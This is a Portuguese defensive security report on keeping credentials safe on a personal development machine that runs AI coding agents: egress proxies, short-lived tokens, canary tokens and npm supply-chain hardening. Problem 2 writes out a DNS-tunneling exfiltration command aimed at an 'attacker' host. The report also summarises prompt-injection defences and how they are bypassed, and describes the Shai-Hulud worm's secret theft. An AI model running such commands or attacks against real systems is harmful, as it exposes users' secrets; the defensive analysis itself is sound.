# Custódia de credenciais em máquina de desenvolvimento pessoal: soluções para os problemas em aberto (estado da arte, julho/2026)

## TL;DR
- A premissa central do documento (JIT só funciona onde o serviço cunha tokens curtos) **envelheceu bem, mas a fronteira mudou**: em 2026 os dois maiores provedores de IA — Anthropic (WIF GA em 17/jun/2026) e OpenAI (workload identity federation) — passaram a emitir tokens curtos via OIDC/RFC 8693, e Stripe/Twilio/SendGrid já oferecem chaves restritas por escopo; ainda assim a cauda longa de SaaS continua só-de-chave-estática, o que valida o **proxy de egress com injeção de credenciais** como a peça arquitetural que faltava — e essa categoria explodiu de projetos em 2025-2026.
- O maior salto de maturidade foi em **sandboxes de agente com proxy de credenciais no host↔container**, exatamente sua topologia: hoje há dezenas de implementações prontas (Anthropic sandbox-runtime, nono, iron-proxy, microsandbox, shuru/Bromure para Apple Virtualization.framework) que mantêm o segredo fora do container e injetam no egress — vários pensados para macOS + Claude Code.
- O que **continua genuinamente sem solução**: (i) o "egress que parece legítimo" (agente com token válido empurrando dados via commit/push/issues/gist no repo escopado); (ii) prompt injection de forma robusta (o paper conjunto de OpenAI/Anthropic/DeepMind Nasr et al., "The Attacker Moves Second", arXiv:2510.09023, out/2025, mostra que 12 defesas recentes foram contornadas com taxa de sucesso de ataque acima de 90% na maioria — sendo que a maioria havia reportado originalmente sucesso quase-zero); e (iii) auditoria nativa do GitHub para conta pessoal (audit log API é Enterprise-only). Priorize contenção arquitetural (default-deny egress + repo escopado + proxy) sobre detecção.

---

## Problema 1 — Efêmeros para serviços que não são o GitHub

### 1(a) Onde já existe mecanismo nativo e como fiar na prática

**Nuvens (maduro, produção):**
- **AWS STS / AssumeRole** e **AssumeRoleWithWebIdentity**: emite credenciais temporárias (15 min–12 h; default 1 h). Combinado com **IAM Roles Anywhere** dá para uma máquina fora da AWS trocar um certificado X.509 por credenciais STS sem chave estática.
- **GCP**: `IAM Credentials generateAccessToken` (short-lived tokens, até 1 h; até 12 h com política de organização) e **Workload Identity Federation** — troca um OIDC/SAML externo por token do GCP sem service-account key.
- **Azure**: **Managed Identities** (só dentro do Azure) e, para cargas externas, **Workload Identity Federation** com OIDC.

**Bancos e infra:**
- **HashiCorp Vault dynamic secrets** (database secrets engine): gera usuário/senha efêmeros com TTL (ex.: `default_ttl=1h`, `max_ttl=24h`) e revoga automaticamente ao expirar a lease. Suporta PostgreSQL, MySQL, etc. **OpenBao** é o fork OSS equivalente.
- **Certificados SSH com TTL**: Vault SSH secrets engine (CA que assina chaves públicas com `ttl` de, por exemplo, 30 min, imposto pelo OpenSSH), **step-ca** (Smallstep) e **Teleport** — todos maduros para uma máquina individual (Vault em modo dev/single-node ou step-ca são leves).

**Como fiar na prática numa máquina individual:** o padrão que funciona é o mesmo do GitHub App já em uso — um **broker no host** (o script "blessed" sob o Automic Vault) que detém a raiz de confiança (chave STS/Vault token/OIDC) e cunha o efêmero, injetando no container em runtime. Para AWS, o mais limpo é IAM Roles Anywhere com um certificado no Keychain/Secure Enclave; para Anthropic/OpenAI, ver 1(b).

### 1(b) A cauda longa de APIs estáticas — o que evoluiu desde 2024/2025

A premissa do documento **mudou concretamente em 2026** para os provedores de IA:

- **Anthropic Workload Identity Federation**: GA em **17/jun/2026**. Substitui a chave estática `sk-ant-...` por troca OIDC via **RFC 7523 (jwt-bearer grant)** em `POST /v1/oauth/token`; retorna token `sk-ant-oat01-...` com vida configurável **entre 60 s e 86 400 s (default 3600 s)**, ligado a um **service account** (`svac_`). Suporta AWS IAM, GCP, Azure Managed Identity, GitHub Actions, Kubernetes, **SPIFFE**, Entra ID, Okta. Cobre todos os endpoints da API, os SDKs oficiais **e o Claude Code**. Chaves estáticas continuam funcionando em paralelo (migração incremental). *Nota importante para o seu caso: desde 15/jun/2026 o uso programático via Claude Agent SDK/Claude Code com service accounts passou a debitar de créditos separados a preço de API padrão, não do pool de assinatura.*
- **OpenAI**: a referência oficial da API declara que aceita bearer tokens de API keys **ou de access tokens de curta duração criados com workload identity federation**; além do padrão de ephemeral tokens para Realtime. Vault/OpenBao têm secrets engine para gerar chaves OpenAI dinâmicas.
- **Stripe**: **restricted API keys** (`rk_live_`/`rk_test_`) com permissões Read/Write/None por recurso; a doc recomenda "always using restricted keys instead of unrestricted secret keys". Não são efêmeras nativamente, mas reduzem raio de dano.
- **Twilio**: **Restricted API Keys** (Public Beta, gerenciáveis por REST API) com escopo por recurso/ação.
- **SendGrid (Twilio)**: API keys com scoped permissions (Full/Custom/Billing); omitir `scopes` cria chave Full Access por default (armadilha).

**Padronização emergente:** o vetor comum é **OIDC + OAuth 2.0 Token Exchange (RFC 8693)** e **RFC 7523**. Há um ecossistema de drafts IETF especificamente para agentes (Transaction Tokens e a extensão para agentes, ID-JAG/`draft-ietf-oauth-identity-assertion-authz-grant`, Identity Chaining, WIMSE), além do SEP-1933 (Workload Identity Federation for MCP). São **promessas/rascunhos em 2026**, não maduros, mas indicam a direção.

### Credential-injecting egress proxy — avaliação em profundidade

Esta é, na prática, **a resposta arquitetural para toda a cauda longa estática** e amadureceu enormemente. O padrão canônico ("phantom token"/"stub-and-swap"): o container recebe apenas um **token-placeholder inútil fora do proxy**; o proxy no host termina TLS, casa host/path e **troca o placeholder pelo segredo real no header de saída**, apenas para hosts no allowlist.

**Implementações prontas hoje (adotáveis em máquina individual):**
- **Anthropic sandbox-runtime (`srt`)** — research preview (out/2025, `anthropic-experimental`), ~4,4–4,7k estrelas. Usa `sandbox-exec` (Seatbelt) no macOS e bubblewrap no Linux + proxy de rede; no macOS o perfil Seatbelt só permite loopback às portas do proxy, o resto é bloqueado. É a implementação de referência da categoria.
- **iron-proxy** (Apache-2.0, Go, single binary + YAML) — MITM egress com DNS server embutido, default-deny (403), injeção de segredo na borda, deny-list de IP upstream (bloqueia IMDS/SSRF/DNS-rebinding), trilha de auditoria JSON por request, streaming-aware. Usado pelo Hermes (Nous Research).
- **nono** (Luke Hinds, criador do Sigstore; ~2,6k estrelas) — Landlock + secrets em store nativo do OS + proxy de injeção com phantom token; kernel enforcement em macOS e Linux.
- **microsandbox** (Apache-2.0, YC) — microVM via libkrun, deny-all networking com allowlist de domínio, segredo nunca entra na VM; feito para rodar `claude --dangerously-skip-permissions`.
- **shuru** e **Bromure** — **especificamente macOS + Apple Virtualization.framework**: stub-and-swap no boundary do hipervisor, segredo nunca escreve em disco/env/memória da VM; Bromure ainda faz forward do ssh-agent via socket do Keychain e tem popups human-in-the-loop antes de substituir credenciais sensíveis. **São o encaixe mais direto na sua topologia.**
- **agent-creds** (Macaroons + Envoy TLS-intercept + iptables), **Warden** (broker com SPIFFE SVID), **Leash** (StrongDM; eBPF LSM + header rewriting), **Claw Patrol** (Deno; WireGuard/Tailscale + injeção + regras CEL), **latchkey** (Imbue; injeta credenciais em curl para ~25 APIs conhecidas, store cifrado no OS keyring).
- **Comerciais/gerenciados como referência de arquitetura**: Cloudflare **Outbound Workers for Sandboxes** (GA 13/abr/2026): CA efêmera por instância injetada no sandbox, chave privada nunca sai do sidecar, `allowedHosts` vira deny-by-default, injeção zero-trust ("No token is ever passed into the sandbox"). Anthropic Managed Agent Infrastructure, Vercel, LangChain sandbox auth proxy — todos implementam o mesmo conceito.

**Outras peças "clássicas" reaproveitáveis:** mitmproxy com addon (o projeto `airut` faz exatamente masked-secrets/format-preserving surrogate via mitmproxy), Envoy com filtros, Pomerium, Ory Oathkeeper, Cloudflare Access **service tokens**, Teleport Application Access, **Vault Agent/Proxy** com caching de tokens, Boundary, e agentes de 1Password/Infisical/Doppler Secrets Automation.

**Viabilidade e o problema do TLS interception/pinning:** o proxy exige MITM de TLS, o que implica instalar uma **CA no trust store do container** (fácil, pois você controla a imagem). O ponto de falha real: **certificate pinning** e **esquemas que não são bearer-header** — request signing (AWS SigV4) e OAuth cunhado dentro do SDK **não podem ser trocados por substituição estática de header** (a doc do iron-proxy da Nous Research é explícita: para esses provedores "a garantia de isolamento de egress é incompleta"). Ou seja: o proxy resolve a enorme maioria (APIs bearer-token), mas SigV4/OAuth-no-SDK exigem que o segredo real entre no container OU que se use os mecanismos nativos (STS/WIF) do 1(a). Em máquina individual o custo de implantação é baixo (um binário + YAML + CA), a manutenção é o allowlist de domínios e a rotação da CA.

### OAuth 2.0 Token Exchange (RFC 8693), SPIFFE/SPIRE e o "secret zero"

- **RFC 8693** é o mecanismo por trás de WIF (Anthropic/OpenAI/nuvens): troca-se um token de identidade por um access token restrito. Viável e maduro **quando o destino suporta**.
- **SPIFFE/SPIRE numa topologia host↔container local**: **tecnicamente possível, mas overkill para uma máquina.** SPIRE é projeto graduado da CNCF, roda em Docker, e o SPIRE Agent atesta workloads via seletores (uid, docker, k8s). Papers recentes (IT-SPIRE, 2024/2025) mostram feasibilidade mas também **overhead de inicialização não trivial** (um plugin de atestação de VM confidencial reportou +112,5% no tempo de init do agente). Para host↔container local o modelo de atestação Docker/unix-uid funciona, mas você estaria operando um Server+Agent+datastore para resolver o que o seu broker "blessed" + atestação por hash já resolve. **Recomendação: não adotar SPIRE isolado; se algum dia precisar, use-o como base do broker de injeção (Warden e Riptides já fazem isso).**
- **Secret zero problem**: continua existindo — sempre há uma raiz (a chave do GitHub App no Keychain, o token do Vault, o certificado do IAM Roles Anywhere). O melhor que se faz numa máquina individual é **ancorar o secret zero no hardware** (Secure Enclave/Touch ID — ver Problema 4) e minimizar seu uso (o broker o toca raramente, para cunhar efêmeros).

---

## Problema 2 — Egress de dentro do container

### O que existe hoje e funciona

**A referência da própria Anthropic e suas limitações conhecidas:** o `init-firewall.sh` do devcontainer do Claude Code implementa default-deny via **iptables + ipset**, resolvendo os IPs dos domínios do allowlist (api.github.com, registries, API Anthropic), exige `NET_ADMIN`/`NET_RAW`, e faz teste de conectividade (example.com deve falhar, api.github.com deve passar) antes de liberar o workspace. **Falha documentada e não corrigida (issue #36907):** as regras liberam **DNS (UDP 53) para qualquer destino**, o que permite **exfiltração por DNS tunneling** que contorna completamente o firewall por-IP — `dig @attacker $(cat secret|base64).attacker.com`. Isso é a prova concreta de que allowlist por-IP sem controle de DNS é insuficiente.

**Opções em ordem crescente de robustez:**
1. **Proxy explícito com allowlist de domínios** (default-deny) — o mais alto sinal/esforço. É o que os egress proxies do Problema 1 já fazem; casa injeção de credencial + filtragem num único ponto. O `iron-proxy` inclui DNS server próprio justamente para fechar o buraco do tunneling.
2. **DNS filtering** obrigatório (forçar todo DNS ao resolver interno; bloquear 53 externo) — fecha a falha do devcontainer da Anthropic.
3. **iptables/nftables dentro do container** — o baseline do devcontainer; frágil se o agente tiver root ou `NET_ADMIN`.
4. **eBPF/cgroup network enforcement** — `agentsh`, `Leash` (StrongDM, eBPF LSM por cgroup), `membrane`/`logira` (Tracee), `syva` (zonas por eBPF). Enforcement no kernel, allowlist por hostname com refresh de DNS contínuo. Estado da arte em 2026 para egress fino.
5. **microVM / gVisor** — `microsandbox`, `brood-box`, `matchlock`, `krunai` (libkrun + gVisor netstack): isolamento de kernel + egress default-deny. No macOS especificamente, **capsem** (Google) roda VM Linux via **Apple Virtualization.framework com kernel compilado `CONFIG_INET=n` (sem stack de IP)** — air-gap real.
6. **Específicos para macOS + agentes**: **shuru/Bromure** (Apple Virtualization.framework, egress host-allowlisted), **sandbox-exec/Seatbelt** (usado pelo Anthropic sandbox-runtime e por sandvault/Hazmat), **cplt/landstrip** (Seatbelt no macOS, Landlock no Linux).

**Sobre os runtimes de container no macOS (importante para sua escolha):** Docker Desktop, OrbStack, Colima/Lima e Apple Container (nativo no macOS Tahoe 26+) rodam containers dentro de uma VM Linux. O egress filtering **precisa acontecer dentro dessa VM ou no proxy do host** — o LuLu (firewall por-app do host) só vê o processo do runtime (`com.docker.backend`/OrbStack helper), não os fluxos individuais do container, exatamente como o documento notou. OrbStack segue transparentemente as proxy settings do macOS (útil: dá para forçar HTTP(S)/SOCKS proxy globalmente) e tem toggle "Expose ports to LAN". A conclusão: **não conte com o LuLu para egress de container; ponha o controle na VM (nftables/eBPF) ou, melhor, roteie tudo por um egress proxy explícito no host.**

### O caso do "egress que parece legítimo" — controles do lado GitHub

Este é o cenário **mais difícil e parcialmente sem solução**: um agente comprometido com token de instalação válido (escopado a 1 repo, permissão mínima) que exfiltra via `git push`, criando issues, ou gists. Como o token é legítimo e o destino é o próprio GitHub (no allowlist), nenhum egress proxy o distingue de trabalho real. Controles disponíveis:

- **Push protection / secret scanning** (GitHub Secret Protection): bloqueia **secrets conhecidos** no push. Habilitado por default em **repos públicos** de contas pessoais desde mar/2024 e para todas as contas free (rollout de 29/fev/2024). **Limitação crítica**: não detecta dados genéricos/código-fonte proprietário sendo exfiltrado; só padrões de secret conhecidos; e é bypassável. Para **repos privados** em conta pessoal (free) **não vem ativado** — é feature paga. (Atualizações recentes ampliaram cobertura: nov/2025 passou a detectar chaves privadas com `\n` escapado e reportar secrets em gists não-listados; abr/2026 a push protection passa a caminhar a cadeia de ancestrais de fork.)
- **Rulesets / push rulesets**: bloqueiam push por extensão de arquivo, tamanho, path. Ajudam contra alguns padrões de exfiltração de arquivos, não contra exfiltração via conteúdo de commit normal.
- **Branch protection**: exigir PR + review antes de merge em `main` — impede que o agente escreva direto na branch protegida, mas **não impede push para branch nova nem criação de issues/gists**.
- **Restrições do App**: manter a instalação no mínimo de repos e permissão mínima (o token não pode exceder o teto — ver Problema 7) reduz o raio, mas dentro do 1 repo escopado o dano é total.

**Veredito**: o controle real aqui é **arquitetural, não do GitHub** — (i) dar ao token permissão de leitura apenas quando a tarefa não exige escrita; (ii) revisão humana obrigatória de qualquer push (o Bromure/Claw Patrol fazem approval gates); (iii) detecção por canary (Problema 3). O padrão `yolo-cage` classifica comandos git (LOCAL/BRANCH/MERGE/REMOTE_WRITE/DENIED) e usa mitmproxy fail-closed que **bloqueia operações da API GitHub** e roda TruffleHog em pre-push — é a abordagem mais completa que existe hoje para este subproblema específico.

---

## Problema 3 — Auditoria e detecção de anomalia (config pessoal)

### O que está disponível fora de Enterprise

- **GitHub audit log API**: **Enterprise-only.** Os endpoints `/enterprises/{ent}/audit-log` exigem PAT classic com `admin:enterprise`/`read:audit_log` e enterprise admin; **não funcionam com conta pessoal nem com token de GitHub App**. Para conta pessoal, o substituto viável é **webhooks do GitHub App** (eventos de push, issues, etc.) capturados por um endpoint local, mais o log estruturado do próprio script de cunhagem.
- **Recomendação de alto sinal/baixo esforço**: instrumente o **script "blessed"** com logging estruturado (JSON: timestamp, hash do binário solicitante, repo, permissões concedidas, TTL) e stream para um arquivo append-only. **OpenTelemetry** é opcional; para uma máquina, um JSONL + `jq` já entrega 80% do valor.

### Canary tokens / honeytokens — o maior ROI da lista

**Thinkst Canarytokens** (grátis, canarytokens.org, ou self-host via Docker) é a recomendação de maior sinal/menor esforço para detectar **exfiltração de segredos**:
- **AWS API key canarytoken** (suportado desde 2017): uma chave AWS válida-mas-neutralizada plantada no container/repo/config; **qualquer uso dispara alerta** com IP de origem. Alto valor porque ferramentas de atacante (TruffleHog) **validam automaticamente** as chaves achadas — disparando o alerta mesmo sem uso malicioso efetivo. É exatamente o vetor do worm Shai-Hulud (ver Problema 5), que usa TruffleHog.
- Plantar honeytokens em `~/.aws/credentials` falso, em arquivos de "internal docs", em entradas de MCP server. Qualquer disparo é indicador de altíssima confiança (zero falso-positivo por design).
- **Caveat conhecido**: canarytokens da AWS têm um "tell" — `aws sts get-caller-identity` retorna um username com o domínio beacon da Thinkst; um atacante sofisticado que conheça isso pode evitar a validação. Para o modelo de ameaça "agente comprometido/dependência maliciosa", o tell é irrelevante (o malware valida antes de saber).

### Ferramentas leves de detecção runtime
- **logira** (eBPF, cgroups v2): auditoria OS-level de exec/file/net por run, com regras embutidas (acesso a credenciais, comandos destrutivos, `curl|sh`, egress suspeito). 
- **gryph** (safedep): audit trail local-first para agentes de código.
- **Prempti** (Falco para agentes): intercepta tool calls e avalia contra regras YAML.
- **secret scanning** (Problema 2) como detecção passiva.

---

## Problema 4 — Fadiga de alarme / consent fatigue

### O que a literatura de usable security estabelece

- **Akhawe & Felt (USENIX Security 2013, "Alice in Warningland")**: estudo de campo em larga escala mostrando que warnings de browser têm clickthrough alto e que o design importa — base empírica de que prompts repetitivos são ignorados.
- **Anderson, Vance, Kirwan, Jenkins, Eargle (CHI 2015, "How Polymorphic Warnings Reduce Habituation in the Brain", ACM DOI 10.1145/2702123.2702322; e MIS Quarterly 2018)**: usando **fMRI**, demonstram "a dramatic drop in the visual processing centers of the brain after only the second exposure to a warning, with further decreases with subsequent exposures". A contramedida validada são **warnings polimórficos** (que mudam de aparência): "our polymorphic warning is substantially more resistant to habituation than conventional warnings". O estudo longitudinal (CHI 2017 / MISQ 2018 "Tuning Out Security Warnings") confirma o efeito ao longo de uma semana de trabalho e em experimentos de campo.

### Aplicação concreta ao caso (Claude Code sondando o token a cada startup)

O problema descrito — Claude Code sonda o token a cada startup, gerando prompts que convidam ao clique automático — é **exatamente o cenário de habituação** que a literatura prevê que falhará. Projete o portão (Automic Vault) assim:

1. **Caching com TTL + aprovação por sessão**: aprovar uma vez cunha o token de 1 h; enquanto válido, o startup do Claude Code **não** re-prompta (lê o token cacheado). Isso alinha a frequência do prompt (≤1/hora) à realidade, matando a maior fonte de cliques automáticos. É o padrão do `sudo` (timeout de sessão) e o mais alto ROI aqui.
2. **Batching / risco-adaptativo**: só prompte para ações de **escrita** ou de alto risco; leituras dentro do escopo aprovado passam silenciosamente. Cursor reportou **40% menos interrupções de aprovação** ao ensinar o agente sobre suas próprias restrições de sandbox (Landlock).
3. **Prompts polimórficos**: quando o prompt aparecer, que ele **mude de aparência/posição/texto** (mostrando o hash do binário solicitante, o repo, as permissões e o TTL, com layout variável) — resistência empírica à habituação.
4. **Hardware attestation com Touch ID/Secure Enclave**: substitua o clique por **biometria**. No macOS, `pam_tid.so` via `/etc/pam.d/sudo_local` (persistente a updates desde Sonoma) dá Touch ID para `sudo`; a aprovação é **per-session** e ancorada no Secure Enclave (o SE só devolve yes/no, dado nunca sai do chip). Um gesto físico e específico é muito mais resistente ao "clique reflexo" do que um botão — e o binário que pede o segredo pode exigir `LocalAuthentication` (Secure Enclave-backed) antes de o broker liberar. Isso conecta o consentimento ao **secret zero ancorado em hardware** do Problema 1.

**Trade-off**: caching agressivo aumenta a janela de dano (Problema 5). Calibre o TTL ao raio de dano do token (1 h para token de 1 repo/permissão mínima é defensável; menos para tokens mais poderosos).

---

## Problema 5 — Raio de dano na janela, prompt injection e confused deputy

### Estado da arte (2025-2026) em contenção de agentes

- **Lethal trifecta** (Simon Willison, jun/2025; formalizada pela Palo Alto Networks em 2026): dano só ocorre quando coexistem **(1) acesso a dados privados, (2) exposição a conteúdo não-confiável, (3) capacidade de exfiltração**. É o checklist de design mais útil: **quebre uma das três pernas**. Na sua arquitetura, o egress proxy default-deny quebra a perna (3); o repo escopado limita a (1).
- **Dual-LLM (Willison, 2023) e CaMeL (DeepMind, Debenedetti et al., arXiv:2503.18813, mar/2025)**: CaMeL separa **control flow (do query confiável) de data flow (dados não-confiáveis)** via um P-LLM (privilegiado, planeja) e um Q-LLM (quarentenado, processa dados não-confiáveis, sem acesso a ferramentas), com um **interpretador que rastreia proveniência (capabilities) e impõe política antes de cada tool call**. Resolve com segurança provável **67% das tarefas do AgentDojo** (NeurIPS 2024) na versão inicial; a v2 revisada reporta **77% das tarefas com segurança provável (contra 84% de um sistema sem defesa)**. Código em `github.com/google-research/camel-prompt-injection`. **Limitação inerente**: o P-LLM não pode planejar sobre dados que não pode ler.
- **Realidade sóbria (2025-2026)**: o paper **Nasr et al., "The Attacker Moves Second" (arXiv:2510.09023, 10/out/2025)**, com 14 autores de **OpenAI, Anthropic e Google DeepMind**, contornou **12 defesas recentes com taxa de sucesso de ataque acima de 90% na maioria** — "importantly, the majority of defenses originally reported near-zero attack success rate"; defesas por prompting colapsaram a 95–99% de ASR e as por treino a 96–100%. **Conclusão para o seu caso: não confie em defesa de prompt injection no nível do modelo; confie em contenção (capability-based, human-in-the-loop em ações irreversíveis, taint tracking, default-deny egress).**
- **OWASP Top 10 for Agentic Applications (ASI, dez/2025)**: primeira taxonomia padrão para agentes. **ASI01: Agent Goal Hijack** é o topo. Há também o **OWASP Agentic Skills Top 10** (2026), motivado por CVEs reais em Claude Code — **CVE-2025-59536 (CVSS 8.7)**, que permite execução automática de comandos shell arbitrários na inicialização da ferramenta (corrigido na versão 1.0.111), e **CVE-2026-21852 (CVSS 5.3)**, em que um repositório malicioso exfiltra dados incluindo chaves da API Anthropic (corrigido na versão 2.0.65). Reforça isolar por-projeto (o que você já faz) e não confiar em consent dialog.
- **Ferramentas de capability/policy prontas**: `Leash` (Cedar via eBPF LSM), `ibac` (intent-based access control, 100% de bloqueio no AgentDojo em modo estrito), `carapace`/`SentinelGate` (Cedar/CEL), `agentcontainers` (broker de aprovação default-deny + eBPF). Human-in-the-loop em ações irreversíveis é consenso.

### Cadeia de suprimentos dentro do container (npm/pip)

Os incidentes de 2025 **mudaram as recomendações**:
- **Shai-Hulud** (set/2025): primeiro **worm auto-replicante** do npm. Versão inicial via **postinstall**; segundo a Zscaler ThreatLabz, "over 200 npm packages and more than 500 versions were compromised between September 14th and 18th" (incl. `@ctrl/tinycolor` e pacotes da CrowdStrike), sendo o Patient Zero identificado pela ReversingLabs como `rxnt-authentication` v0.0.3, publicado em 14/set às 17:58:50 UTC. Usa **TruffleHog** para achar secrets, harvest de env vars e IMDS, cria repo público "Shai-Hulud" com os secrets, e usa tokens npm/GitHub achados para se propagar. **Shai-Hulud 2.0 / "The Second Coming"** (nov/2025): executou em **pre-install** (raio maior); a JFrog contabilizou 796 novos pacotes maliciosos e a Palo Alto Unit 42 "over 25,000 malicious repositories across about 350 unique users" (a Datadog estima que os pacotes somam mais de 20 milhões de downloads semanais), com fallback destrutivo do home dir.
- **Recomendações atuais (endurecidas)**:
  - **`npm install --ignore-scripts`** (ou `.npmrc` com `ignore-scripts=true`) — mata o vetor postinstall/preinstall. É a defesa nº 1 depois do Shai-Hulud.
  - **pnpm** — desde a v10 **não roda lifecycle scripts de dependências por default** (allowlist explícita via `onlyBuiltDependencies`); a pnpm publicou política de **cooldown** (não instalar versões com menos de N dias) — teria bloqueado os dois Shai-Hulud (janelas de remoção de 2,5 h e ~12 h).
  - **socket.dev** — análise comportamental de pacotes (detecta install scripts, acesso a rede/fs novos).
  - **Registry proxy / allowlist de registry** (Verdaccio, JFrog) + **lockfile auditing** + pinning por digest.
  - **Rodar o install DENTRO do sandbox com egress default-deny** — mesmo que um postinstall dispare, o egress proxy bloqueia o phone-home e o canary token detecta a tentativa. **É a sinergia com os Problemas 2 e 3.**

---

## Problema 6 — Plano de política que cruza a fronteira host↔container

**Pergunta**: existe hoje algo que governe políticas de segredos **dentro** do container do mesmo modo que o Automic Vault governa o host?

**Resposta honesta: parcialmente, e a resposta prática é não replicar o AV dentro do container — é manter o segredo fora dele.** Avaliação:

- **A abordagem certa não é "governar segredos dentro do container", é "não ter segredos dentro do container".** Todo o ecossistema de 2026 convergiu nisso: o broker/proxy fica no **host** (raiz de confiança), o container recebe só placeholders. Isso torna o AV-dentro-do-container **desnecessário por design**.
- **SPIFFE/SPIRE**: pode dar identidade ao workload no container (SVID) e o broker injeta com base nisso (Warden, Riptides fazem). Viável mas pesado para uma máquina (ver Problema 1).
- **Vault Agent/Proxy**: roda como sidecar, faz auth (ex.: AppRole/JWT) e cacheia tokens; pode entregar segredos via template/socket. Maduro, mas você estaria colocando um cliente Vault com credencial no container — **movendo o secret zero para dentro**, o que contraria o princípio.
- **Agentes de 1Password / Infisical / Doppler**: `secretless-ai` (hook PreToolUse do Claude Code, backends 1Password/keychain/AES-GCM), Infisical Agent Sentinel (MCP gateway com authz e audit), Doppler. Úteis, mas o padrão superior continua sendo **injeção no egress** (o segredo nunca entra no processo do agente, nem em env).
- **Design geral de "broker de segredos local"**: é **exatamente o que você já tem** (script blessed + AV + atestação por hash). O reforço recomendado é evoluí-lo para **broker de injeção de egress** (Problema 1), unificando cunhagem JIT (GitHub) + injeção de header (cauda longa estática) + default-deny (Problema 2) + log/canary (Problema 3) num só ponto no host.

**Conclusão**: **não** construa um "AV dentro do container". Construa um **broker de egress no host** que (a) cunha efêmeros onde há suporte nativo (GitHub App, Anthropic WIF, STS), (b) injeta headers para a cauda longa estática, (c) impõe allowlist default-deny, (d) loga tudo. Projetos que já materializam esse design end-to-end: **Bromure/shuru** (macOS-nativo), **nono**, **iron-proxy**, **Warden**, **Claw Patrol**.

---

## Problema 7 — Ciclo de vida e rotação

### Chave privada do GitHub App: mecânica primária (GitHub Docs)

- **Máximo de 25 chaves privadas por App**, e a rotação é desenhada em torno disso: *"You can create up to 25 private keys for an app. You should use multiple keys in order to rotate keys without downtime... Private keys do not expire and instead need to be manually revoked."* **Rotação sem downtime**: gere a nova chave (passa a assinar JWTs com ela), atualize o broker, depois delete a antiga na UI. *"If your GitHub App has only one key, you will need to generate a new key before deleting the old key."*
- **Não há endpoint REST para criar/deletar chaves privadas de GitHub App** — é **só pela UI** (Settings → Developer settings → GitHub Apps). A única API que já devolveu um PEM é a conversão do **App Manifest flow** (`POST /app-manifests/{code}/conversions`), one-time na criação. **Implicação**: a rotação da chave-raiz **não é totalmente automatizável**; agende-a manualmente (ex.: trimestral) com um checklist. O que **é** automatizável é a cunhagem do token de instalação.
- **Token de instalação** (`POST /app/installations/{id}/access_tokens`): *"The installation access token will expire after 1 hour."* Aceita `repositories`/`repository_ids` (até 500) e `permissions` para **escopar abaixo** do concedido. **Teto rígido**: *"The installation access token cannot be granted permissions that the app was not granted"* e *"...cannot be granted access to repositories that the installation was not granted access to."* → **as permissões da instalação são o teto dos tokens** — exatamente a premissa do documento, confirmada.

### fine-grained PAT vs GitHub App (uso pessoal)

- **fine-grained PAT**: escopável a repos específicos e permissões granulares, mas **atado a uma conta humana**, expiração em **escala de dias/meses** (mínimo **1 dia** — não há sub-dia; a mudança de 18/out/2024 permite **até sem expiração** para PATs pessoais, embora orgs/enterprises tenham teto default de 366 dias), e exige aprovação do resource owner a cada emissão em contexto org. **Bom como stepping stone / fallback manual**, ruim para automação (não há token de 1 h). *(Nota: a doc do GitHub não traz uma frase verbatim afirmando "mínimo 1 dia"; o piso de 1 dia é inferido do changelog "between 1 and 366 days" e da granularidade diária do seletor de datas.)*
- **GitHub App**: identidade de primeira classe separada de humano, **tokens de instalação de 1 h**, escopo por repo/permissão, rate limit maior (15 000/h por instalação vs 5 000/h por usuário). **Veredito: para o seu uso (agente automatizado, efêmero, 1 repo), o GitHub App é a escolha correta** — a arquitetura atual já acertou. O fine-grained PAT só entra como quebra-galho quando registrar um App não é viável.

### Rotina de hardening (baixo esforço, alto valor)
- **Rotação da chave do App**: trimestral, manual, sem downtime (25-key headroom). Registre no log estruturado.
- **Revisão periódica de instalações**: confira que o App está instalado no **mínimo de repos** e com permissão mínima; remova repos órfãos. Trimestral.
- **Secret scanning / push protection**: garanta ativo nos repos (público pessoal: default; privado pessoal free: **não é default** — considere ativar se tiver o plano, ou compensar com canary + pre-push TruffleHog).
- **Verificação de estado de hardening**: script que checa (a) firewall do devcontainer sem o buraco de DNS; (b) `--ignore-scripts`/pnpm; (c) CA do proxy válida; (d) canary tokens plantados e vivos; (e) Touch ID/`sudo_local` presente.

---

## Recomendações — priorizadas por esforço/redução de risco (máquina individual)

**Fase 0 — imediato, baixíssimo esforço, alto ganho:**
1. **Plante canary tokens** (AWS API key da Thinkst) no container, em `~/.aws/credentials` falso e em arquivos-isca. Alerta de exfiltração de altíssima confiança, ~60 s para configurar. *(Problema 3, 5)*
2. **`npm install --ignore-scripts` / migre para pnpm v10** com cooldown; rode todo install dentro do sandbox. Fecha o vetor Shai-Hulud. *(Problema 5)*
3. **Feche o buraco de DNS** do firewall do container (force DNS ao resolver interno, bloqueie 53 externo). *(Problema 2)*
4. **Cache do token com TTL/sessão** para o Claude Code parar de re-promptar a cada startup. Mata a fadiga de alarme na origem. *(Problema 4)*

**Fase 1 — o movimento estrutural (esforço médio, maior redução de risco):**
5. **Adote um egress proxy com injeção de credencial no host**, roteando todo o egress do container por ele, default-deny com allowlist de domínios. Comece por **Bromure ou shuru** (nativos macOS + Apple Virtualization.framework) ou **iron-proxy/nono** se preferir Docker. Isso unifica: quebra a perna de exfiltração da lethal trifecta, tira a cauda longa de chaves estáticas de dentro do container, e centraliza log/auditoria. **É a maior redução de risco por unidade de esforço da lista.** *(Problemas 1, 2, 3, 6)*
6. **Migre Anthropic para WIF** (GA jun/2026): elimine a chave estática `sk-ant-` do fluxo do Claude Code, usando OIDC→token de 1 h. *(Problema 1)*
7. **Touch ID/Secure Enclave no portão** (`pam_tid.so`/`LocalAuthentication`): substitua o clique por biometria per-session ancorada em hardware. *(Problema 4)*

**Fase 2 — endurecimento e higiene contínua:**
8. **Human-in-the-loop obrigatório em push/ações irreversíveis** (approval gate); branch protection + PR em `main`; considere o classificador de comandos git do `yolo-cage` para o problema do "egress legítimo". *(Problemas 2, 5)*
9. **Rotação trimestral manual da chave do GitHub App** (sem downtime), revisão de instalações, e um script de verificação de hardening. *(Problema 7)*
10. **Log estruturado JSONL do broker** + webhooks do GitHub App (substituto do audit log, indisponível em conta pessoal). *(Problema 3)*

**Benchmarks que mudariam a recomendação:**
- Se você passar a rodar **código de terceiros genuinamente não-confiável** (não só seu + dependências), suba de container para **microVM** (microsandbox/capsem) — kernel compartilhado deixa de ser aceitável.
- Se o volume de projetos/agentes crescer para escala de time, aí **SPIFFE/SPIRE + Vault** passam a valer o overhead; numa máquina individual, não.
- Se as APIs da cauda longa que você usa adotarem WIF/OAuth (seguindo Anthropic/OpenAI), **migre do proxy de injeção para o efêmero nativo** naquele serviço e reduza a superfície de MITM.

---

## Caveats
